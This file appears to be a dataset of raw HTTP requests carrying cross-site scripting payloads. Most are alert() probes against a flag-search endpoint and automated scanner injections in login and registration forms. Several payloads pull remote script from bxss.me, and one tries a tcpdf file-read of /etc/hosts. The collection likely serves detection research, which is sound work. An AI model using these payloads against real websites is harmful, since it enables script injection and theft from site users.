"/seArch_For_ONe_flag.php?userid=%3Cscript%3Ealert%28%27flagggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg%27%29%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive

"
"/seArch_For_ONe_flag.php?userid=<script>alert(1);</script> HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.2141.400 QQBrowser/9.5.10219.400
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4
Connection: keep-alive

"
"/seArch_For_ONe_flag.php?userid=%3Cscript%3Ealert%28%27document%27%29%3C%2Fscript%3E HTTP/1.1
Accept: text/html, application/xhtml+xml, image/jxr, */*
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0; 2345Explorer/9.5.0.17997) like Gecko
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=1%27a%3Cscript%3Ealert(%271%27);%3C/script%3E HTTP/1.1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

"
"/login/ HTTP/1.1
Content-Length: 177
Content-Type: application/x-www-form-urlencoded
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

csrfmiddlewaretoken=EUMxPoXUB57zWB1QZRguye0F0LZ0mA5cRWAxOCllhfA3AJzwlobau3HvlM7BTGfz&password=g00dPa%2524%2524w0rD'""()%26%25<acx><ScRiPt%20>roYL(9721)</ScRiPt>&username=hqbuajpq"
"/login/ HTTP/1.1
Content-Length: 173
Content-Type: application/x-www-form-urlencoded
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

csrfmiddlewaretoken=uanmJxsMnZOWUqMj6drFtd3pF3d8eup9HcbmILQd39hqyykZsKmlp2Kf04lJLAzw&password=g00dPa%24%24w0rD&username=hqbuajpq'""()%26%25<acx><ScRiPt%20>roYL(9955)</ScRiPt>"
"/login/ HTTP/1.1
Content-Length: 165
Content-Type: application/x-www-form-urlencoded
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

csrfmiddlewaretoken=uanmJxsMnZOWUqMj6drFtd3pF3d8eup9HcbmILQd39hqyykZsKmlp2Kf04lJLAzw&password=g00dPa%24%24w0rD&username='""()%26%25<acx><ScRiPt%20>roYL(9324)</ScRiPt>"
"/login/ HTTP/1.1
Content-Length: 173
Content-Type: application/x-www-form-urlencoded
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

csrfmiddlewaretoken=EUMxPoXUB57zWB1QZRguye0F0LZ0mA5cRWAxOCllhfA3AJzwlobau3HvlM7BTGfz&password=g00dPa%24%24w0rD&username=hqbuajpq'""()%26%25<acx><ScRiPt%20>roYL(9699)</ScRiPt>"
"/login/ HTTP/1.1
Content-Length: 477
Content-Type: application/x-www-form-urlencoded
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

csrfmiddlewaretoken=e0tNbMFRr6vxWI2vr1mO0R3GWkS0Mvu7r2hNa03i7gY1AQAbNyhuWGKwhl0BjBEu&password=g00dPa%2524%2524w0rD'>""><script%20src=http://bxss.me/s%3fu=013622%26r=1-4%26h=1-bc7e2-1></script><tcpdf%20method=""addTTFFont""%20params=""%255B%2522%255C%252Fetc%255C%252Fhosts%2522%252C%2522TrueType%2522%252C%2522%2522%252C255%252C%2522ftp%253A%255C%252F%255C%252Fftpadmin%253AzaNEgbe8XcCb%2540bxss.me%253A999%255C%252Fbxss%2c013622%2c1-4%2c1%2cbc7e2%2c%2522%255D""/>&username=oilsrngh"
"/login/ HTTP/1.1
Content-Length: 348
Content-Type: application/x-www-form-urlencoded
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

csrfmiddlewaretoken=EUMxPoXUB57zWB1QZRguye0F0LZ0mA5cRWAxOCllhfA3AJzwlobau3HvlM7BTGfz&password=g00dPa%2524%2524w0rD</script><svg/onload='%2b/""/%2b/onmouseover=1/%2b(s=document.createElement(/script/.source)%2cs.src=(/%2c/%2b/bxss.me%5c/s%3fu=013622%26r=1-7%26h=1-bc7e2-2%26/).slice(2)%2cdocument.documentElement.appendChild(s))//'>&username=oilsrngh"
"/login/ HTTP/1.1
Content-Length: 345
Content-Type: application/x-www-form-urlencoded
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

csrfmiddlewaretoken=uanmJxsMnZOWUqMj6drFtd3pF3d8eup9HcbmILQd39hqyykZsKmlp2Kf04lJLAzw&password=g00dPa%24%24w0rD&username=oilsrngh</script><svg/onload='%2b/""/%2b/onmouseover=1/%2b(s=document.createElement(/script/.source)%2cs.src=(/%2c/%2b/bxss.me%5c/s%3fu=013622%26r=1-14%26h=1-bc7e2-2%26/).slice(2)%2cdocument.documentElement.appendChild(s))//'>"
"/login/ HTTP/1.1
Content-Length: 475
Content-Type: application/x-www-form-urlencoded
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

csrfmiddlewaretoken=EUMxPoXUB57zWB1QZRguye0F0LZ0mA5cRWAxOCllhfA3AJzwlobau3HvlM7BTGfz&password=g00dPa%24%24w0rD&username=oilsrngh'>""><script%20src=http://bxss.me/s%3fu=013622%26r=1-19%26h=1-bc7e2-1></script><tcpdf%20method=""addTTFFont""%20params=""%255B%2522%255C%252Fetc%255C%252Fhosts%2522%252C%2522TrueType%2522%252C%2522%2522%252C255%252C%2522ftp%253A%255C%252F%255C%252Fftpadmin%253AzaNEgbe8XcCb%2540bxss.me%253A999%255C%252Fbxss%2c013622%2c1-19%2c1%2cbc7e2%2c%2522%255D""/>"
"/seArch_For_ONe_flag.php?password=1'&userid=1<script>alert(1)</script? HTTP/1.1
User-Agent: curl/7.62.0
Accept: */*

"
"/seArch_For_ONe_flag.php?userid=%22%3E%3Csvg%2Fonload%3Dalert(%27flag%27)%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

"
"/register HTTP/1.1
Content-Length: 662
Content-Type: multipart/form-data; boundary=-----Boundary_QKHFLYYOED
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

-------Boundary_QKHFLYYOED
Content-Disposition: form-data; name=""submit""


-------Boundary_QKHFLYYOED
Content-Disposition: form-data; name=""csrf_token""

IjE1NmIyYTk1ZGJhMzA5ZTZhYjJjODRiY2Q4M2ZjNDQzZTVkY2ZkYmUi.XANTUQ.cILVRyOeGficfWCqqtQbZL89knY</script><svg/onload='+/""/+/onmouseover=1/+(s=document.createElement(/script/.source),s.src=(/,/+/bxss.me\/s?u=030252&r=77-17&h=77-4226c-2&/).slice(2),document.documentElement.appendChild(s))//'>
-------Boundary_QKHFLYYOED
Content-Disposition: form-data; name=""password""

g00dPa$$w0rD
-------Boundary_QKHFLYYOED
Content-Disposition: form-data; name=""username""

mqqsxkmk
-------Boundary_QKHFLYYOED--

"
"/register HTTP/1.1
Content-Length: 740
Content-Type: multipart/form-data; boundary=-----Boundary_PFYEOYGIBX
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

-------Boundary_PFYEOYGIBX
Content-Disposition: form-data; name=""submit""


-------Boundary_PFYEOYGIBX
Content-Disposition: form-data; name=""csrf_token""

IjE1NmIyYTk1ZGJhMzA5ZTZhYjJjODRiY2Q4M2ZjNDQzZTVkY2ZkYmUi.XANTUQ.cILVRyOeGficfWCqqtQbZL89knY
-------Boundary_PFYEOYGIBX
Content-Disposition: form-data; name=""password""

g00dPa$$w0rD'>""><script src=http://bxss.me/s?u=030252&r=77-20&h=77-4226c-1></script><tcpdf method=""addTTFFont"" params=""%5B%22%5C%2Fetc%5C%2Fhosts%22%2C%22TrueType%22%2C%22%22%2C255%2C%22ftp%3A%5C%2F%5C%2Fftpadmin%3AzaNEgbe8XcCb%40bxss.me%3A999%5C%2Fbxss,030252,77-20,77,4226c,%22%5D""/>
-------Boundary_PFYEOYGIBX
Content-Disposition: form-data; name=""username""

mqqsxkmk
-------Boundary_PFYEOYGIBX--

"
"/login HTTP/1.1
Content-Length: 662
Content-Type: multipart/form-data; boundary=-----Boundary_UBDKCAAEER
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

-------Boundary_UBDKCAAEER
Content-Disposition: form-data; name=""submit""


-------Boundary_UBDKCAAEER
Content-Disposition: form-data; name=""csrf_token""

Ijc4ODQwYzA0M2JiMmNiNDE0MjE1ZDY2NDk5ZGQ1MzBkNWRlZjY5ZGUi.XANTUQ.XsTuoYKPT5gIMZYtglIqLJP7AS8
-------Boundary_UBDKCAAEER
Content-Disposition: form-data; name=""password""

g00dPa$$w0rD
-------Boundary_UBDKCAAEER
Content-Disposition: form-data; name=""username""

mwecsqvb</script><svg/onload='+/""/+/onmouseover=1/+(s=document.createElement(/script/.source),s.src=(/,/+/bxss.me\/s?u=030252&r=77-49&h=77-4fc52-2&/).slice(2),document.documentElement.appendChild(s))//'>
-------Boundary_UBDKCAAEER--

"
"/register HTTP/1.1
Content-Length: 506
Content-Type: multipart/form-data; boundary=-----Boundary_XEPNHKFKVL
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

-------Boundary_XEPNHKFKVL
Content-Disposition: form-data; name=""submit""


-------Boundary_XEPNHKFKVL
Content-Disposition: form-data; name=""csrf_token""

IjE1NmIyYTk1ZGJhMzA5ZTZhYjJjODRiY2Q4M2ZjNDQzZTVkY2ZkYmUi.XANTUQ.cILVRyOeGficfWCqqtQbZL89knY
-------Boundary_XEPNHKFKVL
Content-Disposition: form-data; name=""password""

g00dPa$$w0rD'""()&%<acx><ScRiPt >HIKZ(9090)</ScRiPt>
-------Boundary_XEPNHKFKVL
Content-Disposition: form-data; name=""username""

qgdvuuhw
-------Boundary_XEPNHKFKVL--

"
"/login HTTP/1.1
Content-Length: 662
Content-Type: multipart/form-data; boundary=-----Boundary_WYSEPPHUXW
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

-------Boundary_WYSEPPHUXW
Content-Disposition: form-data; name=""submit""


-------Boundary_WYSEPPHUXW
Content-Disposition: form-data; name=""csrf_token""

Ijc4ODQwYzA0M2JiMmNiNDE0MjE1ZDY2NDk5ZGQ1MzBkNWRlZjY5ZGUi.XANTUQ.XsTuoYKPT5gIMZYtglIqLJP7AS8</script><svg/onload='+/""/+/onmouseover=1/+(s=document.createElement(/script/.source),s.src=(/,/+/bxss.me\/s?u=030252&r=77-45&h=77-4fc52-2&/).slice(2),document.documentElement.appendChild(s))//'>
-------Boundary_WYSEPPHUXW
Content-Disposition: form-data; name=""password""

g00dPa$$w0rD
-------Boundary_WYSEPPHUXW
Content-Disposition: form-data; name=""username""

mwecsqvb
-------Boundary_WYSEPPHUXW--

"
"/seArch_For_ONe_flag.php?userid=50%3Cscript%3Ealert%28document.cookies%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=%3Cimg+src%3D1+onerror%3Dalert(1)+%2F%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,ar;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=%3Cimg+src%3D1+onerror%3Dalert%281%29+%2F%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,ar;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

"
"/login?wvstest=javascript:domxssExecutionSink(1,%22'%5C%22%3E%3Cxsstag%3E()locxss%22) HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,en,*
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 467

-------Boundary_FPNDQDGQHB
Content-Disposition: form-data; name=""submit""


-------Boundary_FPNDQDGQHB
Content-Disposition: form-data; name=""csrf_token""

ImI5YmY0YjExMzM4ZTQ3ZTI1MDAxNGMwNjFlMjI2Njg5ZGQwOTJlN2Mi.XANbwg.VvK7ZolouCUwd4evny9dv0CnCnk
-------Boundary_FPNDQDGQHB
Content-Disposition: form-data; name=""password""

g00dPa$$w0rD
-------Boundary_FPNDQDGQHB
Content-Disposition: form-data; name=""username""

vhgwbeew
-------Boundary_FPNDQDGQHB--

"
"/register HTTP/1.1
Content-Length: 740
Content-Type: multipart/form-data; boundary=-----Boundary_CBQKYQCYCR
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

-------Boundary_CBQKYQCYCR
Content-Disposition: form-data; name=""submit""


-------Boundary_CBQKYQCYCR
Content-Disposition: form-data; name=""csrf_token""

IjExMWIzMDIyYjUzNzEzYTk0M2I0NmVlOWUwNmMzZmJiOTY3NTBmZDMi.XANbwg.d3eaO5f2JGZQW8kpZ9pZaZVZFPI'>""><script src=http://bxss.me/s?u=030252&r=79-42&h=79-b6472-1></script><tcpdf method=""addTTFFont"" params=""%5B%22%5C%2Fetc%5C%2Fhosts%22%2C%22TrueType%22%2C%22%22%2C255%2C%22ftp%3A%5C%2F%5C%2Fftpadmin%3AzaNEgbe8XcCb%40bxss.me%3A999%5C%2Fbxss,030252,79-42,79,b6472,%22%5D""/>
-------Boundary_CBQKYQCYCR
Content-Disposition: form-data; name=""password""

g00dPa$$w0rD
-------Boundary_CBQKYQCYCR
Content-Disposition: form-data; name=""username""

nsesbfph
-------Boundary_CBQKYQCYCR--

"
"/register HTTP/1.1
Content-Length: 415
Content-Type: multipart/form-data; boundary=-----Boundary_TBXQGKAOTR
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

-------Boundary_TBXQGKAOTR
Content-Disposition: form-data; name=""submit""


-------Boundary_TBXQGKAOTR
Content-Disposition: form-data; name=""csrf_token""

'""()&%<acx><ScRiPt >bp2y(9237)</ScRiPt>
-------Boundary_TBXQGKAOTR
Content-Disposition: form-data; name=""password""

g00dPa$$w0rD
-------Boundary_TBXQGKAOTR
Content-Disposition: form-data; name=""username""

trtwfaqo
-------Boundary_TBXQGKAOTR--

"
"/register HTTP/1.1
Content-Length: 506
Content-Type: multipart/form-data; boundary=-----Boundary_KSCJICSTKF
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

-------Boundary_KSCJICSTKF
Content-Disposition: form-data; name=""submit""


-------Boundary_KSCJICSTKF
Content-Disposition: form-data; name=""csrf_token""

IjExMWIzMDIyYjUzNzEzYTk0M2I0NmVlOWUwNmMzZmJiOTY3NTBmZDMi.XANbwg.d3eaO5f2JGZQW8kpZ9pZaZVZFPI
-------Boundary_KSCJICSTKF
Content-Disposition: form-data; name=""password""

g00dPa$$w0rD
-------Boundary_KSCJICSTKF
Content-Disposition: form-data; name=""username""

visxgsdq'""()&%<acx><ScRiPt >bp2y(9735)</ScRiPt>
-------Boundary_KSCJICSTKF--

"
"/seArch_For_ONe_flag.php?userid=%3Cscript%3Ealert(document.URL)%3C/script%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=%3Cscript%3Ealert(%27ecnu%27)%3C/script%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close

"
"/login HTTP/1.1
Content-Length: 494
Content-Type: multipart/form-data; boundary=-----Boundary_RFJAEJGWPW
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

-------Boundary_RFJAEJGWPW
Content-Disposition: form-data; name=""submit""


-------Boundary_RFJAEJGWPW
Content-Disposition: form-data; name=""csrf_token""

IjZmNmQxMTFhMTUxYTU1MzJhYTAzYzMyNzlhNzljMjE3OWE2N2I3NTgi.XAM8uw.2p5mXFQM6LhOLIG7MAYv7bkzz8U
-------Boundary_RFJAEJGWPW
Content-Disposition: form-data; name=""password""

'""()&%<acx><ScRiPt >ixFf(9649)</ScRiPt>
-------Boundary_RFJAEJGWPW
Content-Disposition: form-data; name=""username""

tommfydr
-------Boundary_RFJAEJGWPW--

"
"/login HTTP/1.1
Content-Length: 506
Content-Type: multipart/form-data; boundary=-----Boundary_WCGXOBQRWB
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

-------Boundary_WCGXOBQRWB
Content-Disposition: form-data; name=""submit""


-------Boundary_WCGXOBQRWB
Content-Disposition: form-data; name=""csrf_token""

IjZmNmQxMTFhMTUxYTU1MzJhYTAzYzMyNzlhNzljMjE3OWE2N2I3NTgi.XAM8uw.2p5mXFQM6LhOLIG7MAYv7bkzz8U
-------Boundary_WCGXOBQRWB
Content-Disposition: form-data; name=""password""

g00dPa$$w0rD
-------Boundary_WCGXOBQRWB
Content-Disposition: form-data; name=""username""

tommfydr'""()&%<acx><ScRiPt >ixFf(9705)</ScRiPt>
-------Boundary_WCGXOBQRWB--

"
"/login HTTP/1.1
Content-Length: 498
Content-Type: multipart/form-data; boundary=-----Boundary_HLHNOUPACD
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

-------Boundary_HLHNOUPACD
Content-Disposition: form-data; name=""submit""


-------Boundary_HLHNOUPACD
Content-Disposition: form-data; name=""csrf_token""

IjZmNmQxMTFhMTUxYTU1MzJhYTAzYzMyNzlhNzljMjE3OWE2N2I3NTgi.XAM8uw.2p5mXFQM6LhOLIG7MAYv7bkzz8U
-------Boundary_HLHNOUPACD
Content-Disposition: form-data; name=""password""

g00dPa$$w0rD
-------Boundary_HLHNOUPACD
Content-Disposition: form-data; name=""username""

'""()&%<acx><ScRiPt >ixFf(9791)</ScRiPt>
-------Boundary_HLHNOUPACD--

"
"/register HTTP/1.1
Content-Length: 740
Content-Type: multipart/form-data; boundary=-----Boundary_IQISXKENLT
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

-------Boundary_IQISXKENLT
Content-Disposition: form-data; name=""submit""


-------Boundary_IQISXKENLT
Content-Disposition: form-data; name=""csrf_token""

IjhkNDRjZDMxZjJlMjRmYTFiNGNlOGU4ZWU4N2MzNDI3ZTM4ODAxYWIi.XAM8uw.6T3DrVp6jlEs6yB0KclXIo9dIJ8
-------Boundary_IQISXKENLT
Content-Disposition: form-data; name=""password""

g00dPa$$w0rD'>""><script src=http://bxss.me/s?u=030252&r=74-44&h=74-e3f02-1></script><tcpdf method=""addTTFFont"" params=""%5B%22%5C%2Fetc%5C%2Fhosts%22%2C%22TrueType%22%2C%22%22%2C255%2C%22ftp%3A%5C%2F%5C%2Fftpadmin%3AzaNEgbe8XcCb%40bxss.me%3A999%5C%2Fbxss,030252,74-44,74,e3f02,%22%5D""/>
-------Boundary_IQISXKENLT
Content-Disposition: form-data; name=""username""

cvajjpsg
-------Boundary_IQISXKENLT--

"
"/register HTTP/1.1
Content-Length: 506
Content-Type: multipart/form-data; boundary=-----Boundary_MDWHKKTNWF
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

-------Boundary_MDWHKKTNWF
Content-Disposition: form-data; name=""submit""


-------Boundary_MDWHKKTNWF
Content-Disposition: form-data; name=""csrf_token""

IjhkNDRjZDMxZjJlMjRmYTFiNGNlOGU4ZWU4N2MzNDI3ZTM4ODAxYWIi.XAM8uw.6T3DrVp6jlEs6yB0KclXIo9dIJ8
-------Boundary_MDWHKKTNWF
Content-Disposition: form-data; name=""password""

g00dPa$$w0rD'""()&%<acx><ScRiPt >2ZXA(9321)</ScRiPt>
-------Boundary_MDWHKKTNWF
Content-Disposition: form-data; name=""username""

ioaoeiir
-------Boundary_MDWHKKTNWF--

"
"/login?wvstest=javascript:domxssExecutionSink(1,%22'%5C%22%3E%3Cxsstag%3E()locxss%22) HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,en,*
